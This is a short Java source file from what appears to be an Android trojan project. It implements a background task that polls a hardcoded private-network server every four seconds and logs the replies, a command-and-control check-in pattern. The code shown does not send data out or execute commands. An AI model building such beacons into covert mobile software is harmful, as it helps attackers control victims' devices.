package trojan.android.android_trojan.AsyncTask;

import android.os.AsyncTask;
import android.util.Log;

import trojan.android.android_trojan.Tools;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * Created by hoodlums on 14/01/15.
 */
public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
    private static final String TAG = "ConnectionServerTask";
    private HttpClient httpClient;

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        Log.d(TAG, "onPreExecute");

        httpClient = new DefaultHttpClient();
    }

    @Override
    protected Void doInBackground(Void... voids) {
        InputStream inputStream = null;
        String result = "";

        while (!isCancelled()){
            Log.i(TAG, "doInBackground");
            try {
                HttpResponse httpResponse = httpClient.execute(new HttpGet("http://10.10.160.37:8080/test1"));
                inputStream = httpResponse.getEntity().getContent();

                if(inputStream != null){
                    result = convertInputStreamToString(inputStream);
                }else {
                    result = "Did not work!";
                }
            } catch (Exception e) {
                Log.d("InputStream", e.getLocalizedMessage());
            }

            Log.d(TAG, result);
            Tools.sleep(4000);
        }

        return null;
    }

    @Override
    protected void onPostExecute(Void aVoid) {
        super.onPostExecute(aVoid);
        Log.d(TAG, "onPostExecute");
    }

    private static String convertInputStreamToString(InputStream inputStream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;

    }
}
